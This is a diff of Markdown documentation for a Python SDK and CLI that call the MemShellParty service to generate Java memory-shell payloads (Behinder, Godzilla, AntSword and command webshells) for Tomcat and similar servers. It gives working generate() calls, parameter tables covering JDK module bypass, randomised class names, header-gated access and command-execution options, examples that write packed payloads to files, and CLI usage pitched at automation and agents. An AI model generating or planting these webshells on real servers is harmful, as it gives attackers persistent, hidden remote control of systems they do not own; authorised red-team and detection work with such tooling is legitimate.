@@ -1,84 +1,196 @@
 # wtfutil.memshellutil
 
-MemShellParty HTTP client for generating Java memory shells. Default host: [https://party.mem.mk](https://party.mem.mk). CLI: **`memshell`** (not in `__all__`).
+Guide for **Python SDK callers**: call the [MemShellParty](https://github.com/ReaJason/MemShellParty) HTTP service to query valid combos and generate Java memory-shell payloads.
 
-Upstream: [MemShellParty](https://github.com/ReaJason/MemShellParty) · [Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
+- Default host: [https://party.mem.mk](https://party.mem.mk)
+- Upstream: [Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
+- CLI is at the end of this page; prefer `MemShellParty` in scripts and application code.
 
-**No built-in cache**; cache identical configs yourself if needed.
+**No built-in cache.** If you need to reuse results for the same inputs, cache them yourself (by request body or your own key).
+
+---
+
+## Quick start
 
 ```python
-from wtfutil import MemShellParty
+from wtfutil import MemShellParty, MemShellPartyError
 
 with MemShellParty() as client:
     result = client.generate(
+        shell_tool="Behinder",
         shell_type="Listener",
-        target_jre_version=53,
-        behinder_pass="pass",
-        header_value="secret",
+        target_jre_version=53,   # Java 9+; auto byPassJavaModule=True when unset
+        password="pass",         # convenience password → behinderPass
+        header_value="secret",   # header gate (default header_name=User-Agent)
     )
-    print(result["packResult"])
+    payload = result["packResult"]           # packed deliverable string
+    info = result["memShellResult"]          # class names, sizes, connect params
+    print(payload[:80], "...")
+    print(info["shellClassName"], info["injectorClassName"])
 ```
 
-## Configuration
+Import either way:
 
-Precedence: constructor `base_url=` > env `MEMSHELL_BASE_URL` > `wtfconfig.ini` `[memshell] BASE_URL` > default `https://party.mem.mk` (via [`configutil`](configutil.md)).
-
-## MemShellParty
-
-| Method | Description |
-|--------|-------------|
-| `get_config()` | `GET /api/config` |
-| `get_packers_tree()` | `GET /api/config/packers/tree` |
-| `get_command_configs()` | `GET /api/config/command/configs` |
-| `generate(body=None, **)` | `POST /api/memshell/generate` |
-
-Defaults: `Tomcat` / **Behinder** / `Listener` / JRE `50` / `shrink=True` / `staticInitialize=True` / `packer=DefaultBase64`. Auto `byPassJavaModule=True` when JRE >= 53. Command defaults: `RAW` / `RuntimeExec`.
-
-## Parameter reference (official fields)
-
-| CLI / kwargs | Official field | Meaning |
-|--------------|----------------|---------|
-| `--server` | shellConfig.server | Target middleware/framework |
-| `--server-version` | shellConfig.serverVersion | Server version (rarely needed) |
-| `--shell-tool` | shellConfig.shellTool | Tool: Behinder / Godzilla / Command / … |
-| `--shell-type` | shellConfig.shellType | Mount type: Listener / Filter / Valve / … |
-| `--target-jre-version` | shellConfig.targetJreVersion | Class file major version (50=Java6 … 65=21) |
-| `--debug` | shellConfig.debug | Print inject/debug stack traces |
-| `--by-pass-java-module` | shellConfig.byPassJavaModule | Bypass JDK9+ modules via Unsafe defineClass |
-| `--no-shrink` | shellConfig.shrink=false | Default on: ASM SKIP_DEBUG shrink |
-| `--probe` | shellConfig.probe | Wrap injector in probe shell for remote verify |
-| `--lambda-suffix` | shellConfig.lambdaSuffix | Append `$Proxy0$$Lambda$1` to class names |
-| `--url-pattern` | injectorConfig.urlPattern | Mount URL (default `/*`) |
-| `--injector-class-name` | injectorConfig.injectorClassName | Injector FQCN (empty=random) |
-| `--no-static-initialize` | staticInitialize=false | Default on: static block calls ctor |
-| `--shell-class-name` | shellClassName | Shell FQCN (empty=random) |
-| `--behinder-pass` | behinderPass | Behinder password (empty=random) |
-| `--godzilla-pass` / `--godzilla-key` | godzillaPass / godzillaKey | Godzilla pass/key |
-| `--ant-sword-pass` | antSwordPass | AntSword password |
-| `--password` / `password` | (mapped by shellTool) | Convenience password → Behinder/Godzilla/AntSword *Pass; specific `--*-pass` wins |
-| `--key` / `key` | godzillaKey | Convenience Godzilla key; `--godzilla-key` wins |
-| `--header-name` / `--header-value` | headerName / headerValue | Entry header gate |
-| `--command-param-name` | commandParamName | Command param/header name |
-| `--command-template` | commandTemplate | Template with `{command}` |
-| `--encryptor` | encryptor | RAW / BASE64 / DOUBLE_BASE64 |
-| `--implementation-class` | implementationClass | RuntimeExec / ForkAndExec |
-| `--shell-class-base64` | shellClassBase64 | Custom shell .class Base64 |
-| `--packer` | packer | Packing format |
-
-See also `memshell generate --help`.
-
-## CLI
-
-```bash
-memshell generate --help
-memshell generate -o payload.txt
-memshell install-skill --project
+```python
+from wtfutil import MemShellParty
+# or
+from wtfutil.memshellutil import MemShellParty
 ```
 
-## JRE class version
+---
 
-| Java | targetJreVersion |
-|------|------------------|
+## Service URL
+
+Precedence (later wins; constructor wins overall):
+
+1. Default `https://party.mem.mk`
+2. `wtfconfig.ini` `[memshell] BASE_URL` (via [`configutil`](configutil.md))
+3. Env `MEMSHELL_BASE_URL`
+4. Constructor `MemShellParty(base_url="https://...")`
+
+```ini
+# wtfconfig.ini
+[memshell]
+BASE_URL = https://party.mem.mk
+```
+
+```python
+client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
+```
+
+Module-level `memshell_config` is refreshed on client init (mtime hot-reload). Application code usually does not edit it directly.
+
+---
+
+## Client lifecycle
+
+| Pattern | Notes |
+|---------|--------|
+| `with MemShellParty() as client:` | Preferred; closes the internal session on exit |
+| `client = MemShellParty(); ...; client.close()` | Manual close |
+| `MemShellParty(session=existing)` | Reuse an external session; `close()` does **not** close it |
+
+Constructor args:
+
+| Arg | Default | Notes |
+|-----|---------|--------|
+| `base_url` | see above | Service root (trailing slash optional) |
+| `timeout` | `60` | Per-request timeout in seconds; raise if generate is slow |
+| `session` | created internally | Enhanced session from `wtfutil.httputil` |
+
+---
+
+## API overview
+
+| Method | Purpose |
+|--------|---------|
+| `get_config()` | Valid `server → shellTool → shellType` tree |
+| `get_packers_tree()` | Available packer tree |
+| `get_command_configs()` | Command tool encryptors / implementations |
+| `generate(body=None, **kwargs)` | Generate + pack; returns full JSON |
+
+### Discover then generate (recommended)
+
+When you are unsure which `shell_tool` / `shell_type` pairs exist:
+
+```python
+with MemShellParty() as client:
+    cfg = client.get_config()
+    # shape: { "Tomcat": { "Behinder": ["Listener", "Filter", ...], ... }, ... }
+    tools = cfg["Tomcat"]
+    print(sorted(tools.keys()))
+    print(tools["Behinder"])
+
+    packers = client.get_packers_tree()  # [{ "name": "...", "children": [...] }, ...]
+    cmd = client.get_command_configs()  # encryptors / implementationClasses
+```
+
+Invalid combos fail on the server; the SDK raises `MemShellPartyError`.
+
+---
+
+## generate: parameters and defaults
+
+`generate(**kwargs)` uses **snake_case**; the SDK builds official camelCase JSON. You may also pass a full `body=` dict. When both are present, **body deep-merges over** the kwargs-built payload.
+
+### Built-in defaults (aligned with the official UI)
+
+| Dimension | Default |
+|-----------|---------|
+| `server` | `Tomcat` |
+| `shell_tool` | **`Behinder`** |
+| `shell_type` | `Listener` |
+| `target_jre_version` | `50` (Java 6) |
+| `server_version` | `"unknown"` (rarely needed) |
+| `shrink` | `True` |
+| `static_initialize` | `True` |
+| `packer` | `DefaultBase64` |
+| `header_name` | `User-Agent` |
+| `by_pass_java_module` | If omitted: `True` when JRE ≥ 53, else `False` |
+
+For `shell_tool="Command"` when unset: `encryptor="RAW"`, `implementation_class="RuntimeExec"`.
+
+### Passwords and headers
+
+| Form | Behavior |
+|------|----------|
+| `password="x"` | Mapped by `shell_tool` to Behinder / Godzilla / AntSword `*Pass` |
+| `key="k"` | Written as Godzilla `godzillaKey` (usually irrelevant for other tools) |
+| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | **Specific fields win over** convenience `password` / `key` |
+| Empty password fields | Server generates random values; returned in `memShellResult.shellToolConfig` |
+| `header_name` + `header_value` | Request must match this header before shell logic runs; set `header_value` yourself in practice |
+
+```python
+# convenience
+client.generate(shell_tool="Behinder", password="p1", header_value="tok")
+
+# Godzilla
+client.generate(
+    shell_tool="Godzilla",
+    shell_type="Filter",
+    password="pass",
+    key="key",
+    header_value="tok",
+)
+
+# specific field overrides convenience password
+client.generate(shell_tool="Behinder", password="ignored", behinder_pass="real")
+```
+
+### Parameter reference
+
+| kwargs | Official field | Meaning |
+|--------|----------------|---------|
+| `server` | shellConfig.server | Target middleware/framework (Tomcat, Jetty, SpringWebMvc…) |
+| `server_version` | shellConfig.serverVersion | Server version; only needed for a few mount types |
+| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command / AntSword… |
+| `shell_type` | shellConfig.shellType | Listener / Filter / Valve / Servlet / Agent… |
+| `target_jre_version` | shellConfig.targetJreVersion | class major version; see table below |
+| `debug` | shellConfig.debug | Injector prints inject info; shell prints stack traces |
+| `by_pass_java_module` | shellConfig.byPassJavaModule | Bypass JDK9+ modules via Unsafe defineClass |
+| `shrink` | shellConfig.shrink | Shrink bytecode (ASM SKIP_DEBUG); default True |
+| `probe` | shellConfig.probe | Wrap injector in a probe shell for remote verify |
+| `lambda_suffix` | shellConfig.lambdaSuffix | Append `$Proxy0$$Lambda$1` to class names |
+| `url_pattern` | injectorConfig.urlPattern | Mount/match URL; default `/*` |
+| `injector_class_name` | injectorConfig.injectorClassName | Injector FQCN; empty = random |
+| `static_initialize` | injectorConfig.staticInitialize | Static block calls ctor (`Class.forName(..., true, ...)`) |
+| `shell_class_name` | shellToolConfig.shellClassName | Shell FQCN; empty = random |
+| `behinder_pass` | behinderPass | Behinder password |
+| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | Godzilla pass/key |
+| `ant_sword_pass` | antSwordPass | AntSword password |
+| `password` / `key` | (mapped by tool) | Convenience credentials; see above |
+| `header_name` / `header_value` | headerName / headerValue | Entry header gate |
+| `command_param_name` | commandParamName | Command: param or header name |
+| `command_template` | commandTemplate | Command: template with `{command}` |
+| `encryptor` | encryptor | Command: RAW / BASE64 / DOUBLE_BASE64 |
+| `implementation_class` | implementationClass | Command: RuntimeExec / ForkAndExec |
+| `shell_class_base64` | shellClassBase64 | Custom: Base64 of a `.class` |
+| `packer` | packer | Packing format (DefaultBase64, JSP, SpEL…) |
+
+### JRE class version
+
+| Java | `target_jre_version` |
+|------|----------------------|
 | 6 | 50 |
 | 8 | 52 |
 | 9 | 53 |
@@ -86,6 +198,162 @@ memshell install-skill --project
 | 17 | 61 |
 | 21 | 65 |
 
+For JDK 9+ runtimes, prefer at least `53` so module bypass turns on automatically.
+
+---
+
+## Using the response
+
+On success, `generate` returns a **dict** (full server JSON). Common keys:
+
+| Key | Use |
+|-----|-----|
+| `packResult` | Main packed string for the chosen `packer`; usually all you need |
+| `allPackResults` | Multi-format payloads when the server provides them |
+| `memShellResult` | Metadata: class names, sizes, final shell/injector/tool configs |
+
+```python
+result = client.generate(...)
+payload = result["packResult"]
+
+mem = result["memShellResult"]
+print(mem["shellClassName"], mem["injectorClassName"])
+print(mem["shellSize"], mem["injectorSize"])
+print(mem["shellToolConfig"])  # includes real passwords if they were left empty
+```
+
+For compact metadata without a large `packResult`:
+
+```python
+from wtfutil import extract_generate_meta
+
+meta = extract_generate_meta(result)
+# shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
+```
+
+---
+
+## More examples
+
+### Behinder + Filter + packer
+
+```python
+with MemShellParty() as client:
+    r = client.generate(
+        server="Tomcat",
+        shell_tool="Behinder",
+        shell_type="Filter",
+        target_jre_version=52,
+        url_pattern="/*",
+        password="admin",
+        header_name="User-Agent",
+        header_value="Mozilla/5.0-mem",
+        packer="DefaultBase64",
+    )
+    open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
+```
+
+### Command tool
+
+```python
+with MemShellParty() as client:
+    opts = client.get_command_configs()
+    r = client.generate(
+        shell_tool="Command",
+        shell_type="Listener",
+        target_jre_version=53,
+        command_param_name="cmd",
+        encryptor="RAW",
+        implementation_class="RuntimeExec",
+        header_value="x",
+    )
+```
+
+### Official camelCase `body`
+
+```python
+body = {
+    "shellConfig": {"server": "Tomcat", "shellTool": "Behinder", "shellType": "Listener"},
+    "shellToolConfig": {"behinderPass": "p", "headerValue": "h"},
+    "injectorConfig": {"urlPattern": "/*"},
+    "packer": "DefaultBase64",
+}
+# kwargs defaults are built first; body deep-merges on top
+result = client.generate(body=body, target_jre_version=53)
+```
+
+Build the request without sending:
+
+```python
+from wtfutil import build_generate_body
+
+req = build_generate_body(shell_tool="Godzilla", password="p", key="k", header_value="h")
+result = client.generate(body=req)
+```
+
+---
+
+## Error handling
+
+Failures raise `MemShellPartyError`:
+
+| Attribute | Meaning |
+|-----------|---------|
+| `str(e)` / `args` | Message (prefers server `error` field) |
+| `e.status_code` | HTTP status (may be `None`) |
+| `e.body` | Raw body (dict or text snippet) |
+
+```python
+from wtfutil import MemShellParty, MemShellPartyError
+
+try:
+    with MemShellParty() as client:
+        client.generate(shell_type="NotExist")
+except MemShellPartyError as e:
+    print(e, e.status_code, e.body)
+```
+
+Typical causes: illegal combo, unreachable host, non-JSON response, timeout. Transport errors may also surface as raw `requests` exceptions—wrap those if you need a single catch-all.
+
+---
+
 ## Helpers
 
-- `build_generate_body(...)` / `extract_generate_meta(...)` / `MemShellPartyError`
+| Symbol | Notes |
+|--------|--------|
+| `DEFAULT_BASE_URL` | Default service root constant |
+| `memshell_config` | Runtime config dict (`BASE_URL`) |
+| `build_generate_body(...)` | Build request body only (no HTTP) |
+| `resolve_shell_credentials(...)` | Map `password`/`key` to tool-specific fields |
+| `extract_generate_meta(result, output=...)` | Compact meta from a generate response |
+| `MemShellPartyError` | API / protocol errors |
+
+---
+
+## CLI (optional)
+
+The `memshell` console script ships with the package (not in `__all__`). Prefer the SDK for humans and app code; CLI suits automation / agents.
+
+```bash
+memshell generate --help
+memshell generate -o payload.txt
+memshell generate --shell-tool Godzilla --shell-type Filter --target-jre-version 53 -o out.txt
+memshell config
+memshell packers
+memshell install-skill --project
+```
+
+- **`-o PATH`**: write only `packResult` to the file; stdout is meta JSON.
+- **Without `-o`**: stdout is the full response JSON.
+
+Flags mirror the kwargs table above; see `memshell generate --help`.
+
+---
+
+## Tests
+
+```bash
+python -m unittest tests.test_memshell
+# skip live calls to party.mem.mk:
+set MEMSHELL_SKIP_LIVE=1
+```
